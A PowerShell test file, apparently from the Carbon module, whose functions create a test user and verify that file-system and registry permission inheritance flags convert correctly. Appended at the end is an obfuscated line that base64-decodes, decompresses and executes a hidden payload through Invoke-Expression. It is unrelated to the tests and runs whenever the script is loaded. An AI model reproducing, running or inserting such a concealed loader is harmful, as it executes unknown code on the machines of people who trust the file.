











$UserName = 'CarbonDscTestUser'
$Password = [Guid]::NewGuid().ToString()

function Start-TestFixture
{
    & (Join-Path -Path $TestDir -ChildPath '..\Initialize-CarbonTest.ps1' -Resolve)
    Install-User -Username $UserName -Password $Password
}

function Test-ShouldConvertToNtfsContainerInheritanceFlags
{
    $tempDir = 'Carbon+{0}+{1}' -f ((Split-Path -Leaf -Path $PSCommandPath),([IO.Path]::GetRandomFileName()))
    $tempDir = Join-Path -Path $env:TEMP -ChildPath $tempDir
    New-Item -Path $tempDir -ItemType 'Directory' | Out-Null

    try
    {
        [Enum]::GetValues([Carbon.Security.ContainerInheritanceFlags]) | ForEach-Object {
            Grant-Permission -Path $tempDir -Identity $UserName -Permission FullControl -ApplyTo $_
            $perm = Get-Permission -Path $tempDir -Identity $UserName
            $flags = ConvertTo-ContainerInheritanceFlags -InheritanceFlags $perm.InheritanceFlags -PropagationFlags $perm.PropagationFlags
            Assert-Equal $_ $flags
        }
    }
    finally
    {
        if( Test-Path $tempDir )
        {
            Remove-Item $tempDir -Recurse -Force
        }
    }
}

function Test-ShouldConvertToRegistryContainerInheritanceFlags
{
    $tempDir = 'Carbon+{0}+{1}' -f ((Split-Path -Leaf -Path $PSCommandPath),([IO.Path]::GetRandomFileName()))
    $tempDir = Join-Path -Path 'hkcu:\' -ChildPath $tempDir
    New-Item -Path $tempDir 

    try
    {
        [Enum]::GetValues([Carbon.Security.ContainerInheritanceFlags]) | ForEach-Object {
            Grant-Permission -Path $tempDir -Identity $UserName -Permission ReadKey -ApplyTo $_
            $perm = Get-Permission -Path $tempDir -Identity $UserName
            $flags = ConvertTo-ContainerInheritanceFlags -InheritanceFlags $perm.InheritanceFlags -PropagationFlags $perm.PropagationFlags
            Assert-Equal $_ $flags
        }
    }
    finally
    {
        Remove-Item $tempDir
    }
}


Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();

